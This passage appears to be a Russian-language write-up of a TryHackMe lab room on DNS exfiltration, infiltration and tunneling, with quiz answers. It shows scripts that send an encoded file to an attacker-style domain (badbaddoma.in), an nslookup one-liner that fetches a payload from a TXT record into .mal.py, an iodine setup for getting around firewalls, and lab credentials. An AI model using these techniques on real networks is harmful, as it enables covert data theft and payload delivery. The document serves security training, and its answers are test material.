[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [DNS Manipulation](https://tryhackme.com/room/dnsmanipulation) 

Всего 12 заданий:
## Задание 1
В этой комнате мы рассмотрим DNS и продемонстрируем методы, используемые для эксфильтрации и инфильтрации данных. 
Сначала мы рассмотрим, каким целям служит DNS , как он работает и какие типы записей DNS существуют.

На изображении ниже показан базовый DNS- поиск. Здесь клиентская машина обращается к DNS- серверу для преобразования 
полного доменного имени (FQDN) в IP-адрес. 

Затем мы перейдем к тому, как DNS используется в качестве инструмента «эксфильтрации данных» и «инфильтрации данных» 
посредством DNS- запросов. 


И наконец, мы рассмотрим DNS -туннелирование и то, как оно используется для «туннелирования» различных протоколов, 
таких как ( HTTP ), через DNS.

### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```

## Задание 2
[ Код Python, используемый для DNS -эксфильтрации и инфильтрации ]

Я создал несколько простых скриптов, написанных на Python, чтобы вы могли выполнить это пошаговое руководство. Это 
позволит нам делать DNS- запросы к удаленному DNS- серверу.
`git clone https://github.com/kleosdc/dns-exfil-infil`

Также убедитесь, что у вас есть необходимые модули Python3 для запуска кода Python.

Для установки необходимых модулей используйте следующую команду:

`sudo pip3 install -r requirements.txt`

[ Программа, используемая для DNS -туннелирования ]

https://github.com/yarrick/iodine

`sudo apt install iodine`

[ Скачать Wireshark ]

Вы можете использовать Wireshark или tshark для захвата пакетов. Код Python использует . PCAP- файл для извлечения 
захваченных данных и их последующего декодирования.
https://www.wireshark.org/download.html

`sudo apt install -y tshark`

# Ответьте на вопросы ниже
Готовый!

```commandline
Ответ не нужен
```

## Задание 3
Если вы хотите настроить такую же среду, как и я, вам понадобится  публичное доменное имя  и  публичный сервер.

Я не буду подробно рассказывать о покупке доменного имени или предоставлении публичного сервера, поскольку это не 
является необходимым для завершения этой комнаты.

Однако STOK  создал превосходное руководство о том, как настроить все для OOB (внеполосной) кражи данных:  видео STOK

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.

```commandline
Ответ не нужен
```

## Задание 4
Введение

На высоком уровне система доменных имен относится к системе именования, которая разрешает доменные имена с 
IP-адресами. DNS- серверы распределены по всему миру, и они постоянно обновляются и синхронизируются между собой 
систематическим образом. Когда пользователь делает запрос, используя доменное имя, такое как tryhackme.com , DNS 
«транслирует» его в свой IP-адрес, а затем в конечном итоге предоставляет запрашивающему правильный IP-адрес. Также 
стоит отметить, что в некоторых сценариях IP-адрес, возвращаемый DNS , не всегда будет IP-адресом исходного сервера, 
если записи DNS проксируются такой службой, как защита Cloudflare от DDoS.

Технически, каждое устройство, подключенное к Интернету, имеет IP-адрес, который действует как идентификатор при 
общении с другими интернет-устройствами. Поэтому важно понимать, что основная функция DNS и иерархия, которую 
проходит «перевод»,

Серверы корневых имен DNS находятся наверху или в «корне» иерархии DNS и играют важную роль для Интернета. 
Информация для всех «зон» доменов верхнего уровня (TLD), таких как .com, .co.uk, .net и связанных с ними серверов 
имен, размещается на сотнях серверов корневых имен, которые распределены по всему миру.


Ниже приведена иллюстрация из Cloudflare, которая лучше иллюстрирует эту иерархию.



Источник:https://www.cloudflare.com/learning/ dns /glossary/ dns -root-server/

Вот некоторые ресурсы, которые содержат дополнительную информацию о корневых серверах и зонах DNS :

https://www.cloudflare.com/learning/ dns /glossary/ dns -root-server/

https://www.cloudflare.com/learning/ dns /glossary/ dns -zone/


https://www.iana.org/domains/root/servers



Есть и другие типы записей DNS . Однако их не обязательно знать для завершения этого пошагового руководства.

Если вы хотите узнать больше о типах записей DNS , обратитесь к этой статье:

https://www.cloudflare.com/learning/dns/dns-records/ .



### Ответьте на вопросы ниже
Если бы вы работали в Windows, какую команду вы могли бы использовать для запроса txt-записи для «youtube.com»?
```commandline
nslookup -type=txt youtube.com
```
Если бы вы работали в Linux, какую команду вы могли бы использовать для запроса txt-записи для «facebook.com»?
```commandline
dig facebook.com TXT
```
Какой тип IP-адреса хранит AAAA вместе с именем хоста?
```commandline
IPv6
```
Максимальное количество символов для записи DNS TXT — 256. (Ура/Нет)
```commandline
Nay
```
Какая запись DNS предоставляет доменное имя при обратном поиске? (Исследование)
```commandline
PTR
```
Каким будет обратный поиск для следующего адреса IPv4? (192.168.203.2) (Исследование)
```commandline
2.203.168.192.in-addr.arpa
```

## Задание 5
DNS- эксфильтрация — это кибератака на серверы через DNS , которая может быть выполнена вручную или автоматически в 
зависимости от физического местоположения злоумышленника и близости к целевым устройствам. В ручном сценарии 
злоумышленники часто получают несанкционированный физический доступ к целевому устройству для извлечения данных из 
среды. В то время как при автоматизированной DNS- эксфильтрации злоумышленники используют вредоносное ПО для 
проведения эксфильтрации данных, находясь внутри скомпрометированной сети.

DNS — это служба, которая обычно доступна на целевой машине и разрешает исходящий трафик, как правило, через порт  
TCP или UDP 53. Это делает DNS главным кандидатом для хакеров, желающих украсть данные.

Эксфильтрация данных через DNS может позволить злоумышленнику перенести большой объем данных из целевой среды. Более 
того, эксфильтрация DNS в основном используется как способ сбора личной информации, такой как номера социального 
страхования, интеллектуальная собственность или другая персонально идентифицируемая информация.


DNS- эксфильтрация в основном используется путем добавления строк, содержащих желаемую «добычу» в DNS UDP- запросы. 
Строка, содержащая добычу, затем отправляется на мошеннический DNS- сервер, который регистрирует эти запросы. Для 
неопытного глаза это может выглядеть как обычный DNS- трафик, или эти запросы могут потеряться в мешанине многих 
законных DNS- запросов.

### Ответьте на вопросы ниже
Какова максимальная длина имени DNS? (Исследование) ( Длина включает точки! )

```commandline
253
```
## Задание 6
Введение

В этом примере сценария злоумышленник пытается вывести данные в свою систему и решает, что лучшим вариантом будет 
использование DNS- запросов. Целью злоумышленника является вывести конфиденциальную информацию с машины в сети 
SecureCorp. В этой демонстрации я покажу шаги, которые может предпринять злоумышленник, чтобы вывести эти данные с 
скомпрометированной машины.

Следующий материал был сгенерирован с помощью генератора поддельных кредитных карт. Вся информация о кредитных 
картах является поддельной. 

Файлы, используемые для этой демонстрации, находятся в моем репозитории dns -exfil-infil на GitHub. Вам понадобятся 
файлы для завершения остальной части комнаты.


securecorp.txt (https://github.com/kleosdc/dns -exfil -infil/blob/main/securecorp.txt )
пакетный.py (https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py )
packetGrabber.py (https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py )
1. Текстовый файл, содержащий поддельные номера кредитных карт, имена, адреса.

2. packagety.py (  https://github.com/kleosdc/ dns -exfil-infil )

При выполнении packety.py вам необходимо будет предоставить скрипту следующие входные данные:

* Имя файла : (Это файл (РЕКОМЕНДУЕТСЯ текстовый файл), который вы пытаетесь извлечь из сети SecureCorp)

* Доменное имя : (Здесь вы собираетесь разместить свое доменное имя, например, мое доменное имя — badbaddoma.in)



python packety.py

Filename: securecorp.txt

Domain Name (Example: badbaddoma.in): badbaddoma.in

[+] Reading file.

[+] Base64 encoded.

[+] Base58 encoded.

Start transmitting... [PRESS ENTER KEY]


Код начинается с чтения из текстового файла. Содержимое текстового файла сначала будет закодировано в Base64, а 
затем в Base58. Это оставит нам длинную закодированную строку. Затем строка будет разделена на секции длиной в 20 
символов, где к каждой секции будут добавлены 3 «фиктивных» символа для дальнейшей обфускации. Один символ будет 
добавлен к закодированной строке в начало, а два символа будут добавлены в конец.

Например, раздел закодированных данных может выглядеть так: ' 6gfghhjywsas3rg4hda3 '. После добавления 
дополнительных символов получится ' x6gfghhjywsas3rg4hda3yu '. 


После того, как все закодировано и готово, код будет ждать, пока пользователь нажмет «ENTER», чтобы начать передачу 
запросов на DNS- сервер. DNS- сервер уже будет настроен на захват входящих запросов с помощью «Wireshark» или «tshark». 



Затем остается только ждать, пока передача достигнет 100%. Если какой-либо из запросов не будет доставлен вовремя и 
в правильном порядке, извлеченные данные будут неполными и бесполезными для злоумышленника. 


3.  packageyGrabber.py (  https://github.com/kleosdc/ dns -exfil-infil  )

Код запросит у пользователя следующие данные:

* Захваченный файл : это файл . pcap , который вы захватили на своем DNS- сервере.

* Имя выходного файла : это имя файла, в котором будут сохранены декодированные данные.

* Доменное имя : это будет ваше доменное имя.



`python3 ~/tools/packety/packetyGrabber.py`

File captured: cap-credit-cards.pcap

Filename output: credit-cards.txt

Domain Name (Example: badbaddoma.in): badbaddoma.in

[+] Domain Name set to badbaddoma.in

[+] Filtering for your domain name.

[+] Base 58 decoded.

[+] Base 64 decoded.

[+] Output to credit-cards.txt


Если все пройдет успешно, не будет потерян ни одного запроса и все входные данные будут верны, файл с 
декодированными данными будет сохранен в том же каталоге, из которого вы запустили код. 

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 7
Для начала разверните виртуальную машину .

IP-адрес машины:  MACHINE_IP

Учетные данные SSH :

Username: user

Password: P@ssword01


Для этого задания вам необходимо будет выполнить задания, находящиеся в  ~/challenges/exfiltrationпапке.

Инструменты, необходимые для выполнения этой задачи, можно найти в этой папке ~/dns-exfil-infil/.

Примечание: для запуска скриптов Python, найденных в  ~/dns-exfil-infil/ . Обязательно используйте python3

Пример: python3 file.py

Игнорировать исключение, выданное в конце скрипта (packetyGrabber.py)

Прочитать файл TASK, расположенный в ~/challenges/exfiltration/orderlist/ и ~/challenges/exfiltration/identify/.

### Ответьте на вопросы ниже
~/вызовы/эксфильтрация/список заказов/ 

ИДЕНТИФИКАТОР ЗАКАЗА : 1

Каково название транзакции? (Введите его так, как видите)


```commandline
Network Equip.
```
~/вызовы/эксфильтрация/список заказов/ 

ТРАНЗАКЦИЯ : Брандмауэр

Сколько стоил брандмауэр? (Без $)


```commandline
2500
```
~/вызовы/эксфильтрация/идентификация/

Какой файл содержит подозрительные DNS-запросы?


```commandline
cap3.pcap
```
~/вызовы/эксфильтрация/идентификация/

Введите открытый текст после декодирования данных с помощью packetyGrabber.py , который находится в папке ~/dns-exfil-infil/ .

administrator:s3cre7P@ssword

```commandline
Ответ не нужен
```

## Задание 8
DNS- инфильтрация — еще один метод, используемый злоумышленниками для эксплуатации различных уязвимостей в системе 
доменных имен организации.  В отличие от атак эксфильтрации на DNS , инфильтрация определяет процесс, в котором 
вредоносный код запускается для манипулирования DNS- серверами либо с использованием автоматизированных систем, где 
злоумышленники подключаются удаленно к сетевой инфраструктуре, либо вручную.

DNS- инфильтрация в основном используется для сброса файлов или попыток размещения вредоносного ПО. С помощью 
поведенческих, сигнатурных или репутационных систем обнаружения угроз этот метод атаки может быть обнаружен.


Однако, если этот метод передачи данных останется незамеченным, это может привести к вредоносной активности, такой 
как выполнение кода в среде организации. Исторически это вызывало хаос и сбои в работе различных известных компаний. 

Подводя итог, можно сказать, что протокол DNS может использоваться как скрытый протокол, который может помочь в 
подготовке и выполнении вредоносного ПО для обратной связи с сервером/серверами C2 (Command and Control) 
злоумышленника . В следующей задаче мы рассмотрим, как это может быть достигнуто.

### Ответьте на вопросы ниже
Какой тип записи DNS обычно используется для проникновения данных в сеть?


```commandline
TXT
```

## Задание 9
Введение

В этом сценарии злоумышленник собирается внедрить фрагмент «вредоносного» кода на компьютер жертвы. Существует множество различных методов, которые злоумышленники в реальном мире используют для достижения этой цели. Для упрощения я буду использовать запись TXT, настроенную на моем публичном сервере AWS DNS . Значение, содержащееся в этой записи, представляет собой закодированный «вредоносный» код.


Поскольку записи TXT ограничены 255 символами, хакеры, скорее всего, настроят несколько записей TXT для своего DNS- сервера. В конечном итоге это зависит от длины их кода. Теперь, когда все настроено и готово, все, что нужно сделать хакеру, это запросить эти записи TXT, захватить значение/значения, декодировать их и бум... теперь они внедрили свой собственный код в скомпрометированную систему через записи DNS TXT.



Ниже вы можете увидеть мою запись TXT.



Файлы, использованные для этой демонстрации

1. nslookup

Сначала будет выполнен поиск записи TXT для rt1.badbaddoma.in,  затем получено значение в кавычках, и, наконец, значение будет сохранено в файле с именем «.mal.py».

nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py

2. packageSimple.py ( https://github.com/kleosdc/dns-exfil-infil  )

Когда код попросит вас ввести «Имя файла», введите имя файла «.mal.py». Это файл, в котором мы сохранили закодированное значение.



python3 ~/packetySimple.py

Filename: .mal.py

[+] Reading from file...

[+] Base58 decoded.

[+] Base64 decoded.

[+] Done, .mal.py is decoded.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 10
Используйте ту же виртуальную машину из [Задания 7] DNS Exfiltration - Practice .

Прочитайте файл TASK, находящийся в  ~/challenges/infiltration/папке.

ВАЖНО : ДЛЯ ЭТОЙ ЗАДАЧИ ИСПОЛЬЗУЙТЕ ДОМЕНnodrc.comВМЕСТО badbaddoma.in

Вы можете использовать ту же команду, что и в [Задаче 9] DNS-инфильтрация - Демонстрация .

nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py

Имейте в виду, что вам нужно будет настроить раздел 'grep' и использовать соответствующие символы для сопоставления. Например, если текстовое значение из записи TXT начинается с 'G6...', вам нужно будет использовать 'grep G6'.

### Ответьте на вопросы ниже
Чтобы ответить на этот вопрос, следуйте инструкциям в файле ЗАДАНИЯ.

Введите вывод из выполненного файла Python
```commandline
4.4.0-186-generic
```
## Задание 11
В предыдущих двух задачах мы увидели, как запросы и ответы DNS могут использоваться для проникновения и выполнения полезных нагрузок. Компании обычно имеют межсетевые экраны, IDS (системы обнаружения вторжений) и/или IPS (системы защиты от вторжений) для предотвращения/оповещения, когда нежелательные входящие и исходящие протоколы проходят через их сеть. Единственный протокол, который редко отслеживается компаниями, — это DNS . Благодаря этому хакеры могут обходить множество «нежелательных» протоколов, используя туннелирование DNS .

Демо

Для этой демонстрации мы рассмотрим, как хакер может обойти различные запрещенные веб-сайты, используя HTTP через DNS . Для этого я буду использовать «Iodine». Подробнее о «Iodine» можно прочитать здесь:  Iodine .



Моя настройка следующая:

У меня есть Linux- машина, размещенная на AWS , которая будет выполнять функции DNS- туннельного сервера.
На моем локальном компьютере запущена виртуальная машина Ubuntu , которая будет клиентом DNS- туннеля.
Публичное доменное имя, размещенное на Google Domains ( badbadtunnel.in )
Вот как выглядит конфигурация DNS :



Для начала на обеих машинах должен быть установлен iodine. Если у вас дистрибутив на основе Debian, такой как Kali, он будет в их репозиториях apt .

sudo apt install iodine

йод - Клиент

йодированный - Сервер

На сервере AWS запускаем iodined со следующими аргументами:



Порт - 27001

IP для DNS- туннельного сервера - 10.0.0.1

Имя поддомена - tunnel.badbadtunnel.in

Теперь на нашей клиентской машине мы запускаем iodine со следующими аргументами:



IP-адрес DNS -туннельного сервера

Имя поддомена

Если все настроено правильно, то теперь у нас должно быть подключение к нашему DNS Tunnel Server. Мы можем попробовать пинговать 10.0.0.1 ( DNS Tunnel Server), чтобы проверить, подключены ли мы.



Успех!

Теперь мы уже почти на полпути. Наш HTTP через DNS еще не полностью настроен. 

Сначала нам нужно сгенерировать ключ SSH и загрузить содержимое id_rsa.pub на наш DNS Tunnel Server в файл authorized_keys . Вот шаги. 



Это содержимое id_rsa.pub



Здесь вы можете видеть, что я добавил содержимое id_rsa.pub в authorized_keys на моем DNS- сервере. Это позволит мне 
подключаться по SSH к моему серверу. 

Теперь мы можем подключиться по протоколу SSH к нашему серверу DNS- туннеля с помощью опции -D 8080

Почти готово, теперь нам просто нужно открыть наш браузер (в данном случае Firefox) и изменить настройки прокси . 
Существуют также расширения для браузеров, такие как FoxyProxy или Proxy SwitchyOmega. 

Для параметров прокси-сервера нам необходимо выбрать «Ручная настройка прокси-сервера ».


Установите хост SOCKS с IP-адресом «127.0.0.1» и номером порта «8080».

Сделанный!

Теперь мы используем HTTP через DNS ... Если мы перейдем на myip.is, то увидим публичный IP-адрес нашего сервера DNS- туннеля.

### Ответьте на вопросы ниже
Какая программа использовалась для туннелирования HTTP через DNS?
```commandline
iodine
```

## Задание 12
Это моя первая комната, которую я создал на TryHackMe. Надеюсь, вы узнали что-то новое из этого пошагового руководства.



Readme.txt -

      Предложено briskets

            Заблуждение о зависимости: как я взломал Apple, Microsoft и десятки других компаний



### Ответьте на вопросы ниже
Конец
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)